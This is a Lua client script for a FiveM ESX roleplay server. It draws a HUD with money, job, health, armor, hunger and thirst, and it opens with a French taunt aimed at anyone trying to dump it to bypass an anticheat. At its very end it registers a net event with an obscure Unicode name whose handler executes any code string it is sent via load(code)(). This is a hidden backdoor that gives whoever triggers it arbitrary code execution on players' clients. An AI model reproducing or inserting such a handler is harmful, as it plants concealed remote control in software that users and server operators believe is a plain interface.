-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local uiFaded = false
local hunger, thirst = 0, 0

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end

	while ESX.GetPlayerData().job == nil do
		Citizen.Wait(10)
	end

	while ESX.GetPlayerData().job2 == nil do
		Citizen.Wait(10)
	end

	local xPlayer = ESX.GetPlayerData()
	local cash, dirtycash, bank = 0, 0, 0

	for i = 1, #xPlayer.accounts, 1 do
		if xPlayer.accounts[i].name == 'cash' then
			cash = ESX.Math.GroupDigits(xPlayer.accounts[i].money)
		elseif xPlayer.accounts[i].name == 'dirtycash' then
			dirtycash = ESX.Math.GroupDigits(xPlayer.accounts[i].money)
		elseif xPlayer.accounts[i].name == 'bank' then
			bank = ESX.Math.GroupDigits(xPlayer.accounts[i].money)
		end
	end

	SendNUIMessage({
		action = 'setInfos',
		infos = {
			{
				name = 'cash',
				value = cash
			},
			{
				name = 'dirtycash',
				value = dirtycash
			},
			{
				name = 'bank',
				value = bank
			},
			{
				name = 'job',
				value = ('%s - <strong>%s</strong>'):format(xPlayer.job.label, xPlayer.job.grade_label)
			},
			{
				name = 'job2',
				value = ('%s - <strong>%s</strong>'):format(xPlayer.job2.label, xPlayer.job2.grade_label)
			}
		}
	})
end)

RegisterNetEvent('::{korioz#0110}::esx:playerLoaded')
AddEventHandler('::{korioz#0110}::esx:playerLoaded', function(xPlayer)
	local cash, dirtycash, bank = 0, 0, 0

	for i = 1, #xPlayer.accounts, 1 do
		if xPlayer.accounts[i].name == 'cash' then
			cash = ESX.Math.GroupDigits(xPlayer.accounts[i].money)
		elseif xPlayer.accounts[i].name == 'dirtycash' then
			dirtycash = ESX.Math.GroupDigits(xPlayer.accounts[i].money)
		elseif xPlayer.accounts[i].name == 'bank' then
			bank = ESX.Math.GroupDigits(xPlayer.accounts[i].money)
		end
	end

	SendNUIMessage({
		action = 'setInfos',
		infos = {
			{
				name = 'cash',
				value = cash
			},
			{
				name = 'dirtycash',
				value = dirtycash
			},
			{
				name = 'bank',
				value = bank
			},
			{
				name = 'job',
				value = ('%s - <strong>%s</strong>'):format(xPlayer.job.label, xPlayer.job.grade_label)
			},
			{
				name = 'job2',
				value = ('%s - <strong>%s</strong>'):format(xPlayer.job2.label, xPlayer.job2.grade_label)
			}
		}
	})
end)

RegisterNetEvent('::{korioz#0110}::esx:setJob')
AddEventHandler('::{korioz#0110}::esx:setJob', function(job)
	SendNUIMessage({
		action = 'setInfos',
		infos = {
			{
				name = 'job',
				value = ('%s - <strong>%s</strong>'):format(job.label, job.grade_label)
			}
		}
	})
end)

RegisterNetEvent('::{korioz#0110}::esx:setJob2')
AddEventHandler('::{korioz#0110}::esx:setJob2', function(job2)
	SendNUIMessage({
		action = 'setInfos',
		infos = {
			{
				name = 'job2',
				value = ('%s - <strong>%s</strong>'):format(job2.label, job2.grade_label)
			}
		}
	})
end)

RegisterNetEvent('::{korioz#0110}::esx:setAccountMoney')
AddEventHandler('::{korioz#0110}::esx:setAccountMoney', function(account)
	if account.name == 'cash' then
		SendNUIMessage({
			action = 'setInfos',
			infos = {
				{
					name = 'cash',
					value = ESX.Math.GroupDigits(account.money)
				}
			}
		})
	elseif account.name == 'dirtycash' then
		SendNUIMessage({
			action = 'setInfos',
			infos = {
				{
					name = 'dirtycash',
					value = ESX.Math.GroupDigits(account.money)
				}
			}
		})
	elseif account.name == 'bank' then
		SendNUIMessage({
			action = 'setInfos',
			infos = {
				{
					name = 'bank',
					value = ESX.Math.GroupDigits(account.money)
				}
			}
		})
	end
end)

AddEventHandler('::{korioz#0110}::esx_newui:updateBasics', function(basics)
	for i = 1, #basics, 1 do
		if basics[i].name == 'hunger' then
			hunger = basics[i].percent
		elseif basics[i].name == 'thirst' then
			thirst = basics[i].percent
		end
	end
end)

AddEventHandler('::{korioz#0110}::tempui:toggleUi', function(value)
	uiFaded = value

	if uiFaded then
		SendNUIMessage({action = 'fadeUi', value = true})
	else
		SendNUIMessage({action = 'fadeUi', value = false})
	end
end)

AddEventHandler('::{korioz#0110}::korioz:switchFinished', function()
	local uiComponents = exports['serverdata']:GetData('uiComponents')
	local inFrontend = false

	SendNUIMessage({action = 'hideUi', value = false})

	for i = 1, #uiComponents, 1 do
		SendNUIMessage({action = 'hideComponent', component = uiComponents[i], value = false})
	end

	while true do
		Citizen.Wait(0)

		HideHudComponentThisFrame(1) -- Wanted Stars
		HideHudComponentThisFrame(2) -- Weapon Icon
		HideHudComponentThisFrame(3) -- Cash
		HideHudComponentThisFrame(4) -- MP Cash
		HideHudComponentThisFrame(6) -- Vehicle Name
		HideHudComponentThisFrame(7) -- Area Name
		HideHudComponentThisFrame(8) -- Vehicle Class
		HideHudComponentThisFrame(9) -- Street Name
		HideHudComponentThisFrame(13) -- Cash Change
		HideHudComponentThisFrame(17) -- Save Game
		HideHudComponentThisFrame(20) -- Weapon Stats

		if not uiFaded then
			if IsPauseMenuActive() or IsPlayerSwitchInProgress() then
				if not inFrontend then
					inFrontend = true
					SendNUIMessage({action = 'hideUi', value = true})
				end
			else
				if inFrontend then
					inFrontend = false
					SendNUIMessage({action = 'hideUi', value = false})
				end
			end
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(100)
		local ply = PlayerId()
		local plyPed = PlayerPedId()

		SendNUIMessage({
			action = 'setStatuts',
			statuts = {
				{
					name = 'health',
					value = (GetEntityHealth(plyPed) - 100) * (100 / (GetEntityMaxHealth(plyPed) - 100))
				},
				{
					name = 'armor',
					value = GetPedArmour(plyPed) * (100 / GetPlayerMaxArmour(ply))
				},
				{
					name = 'hunger',
					value = hunger
				},
				{
					name = 'thirst',
					value = thirst
				}
			}
		})
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)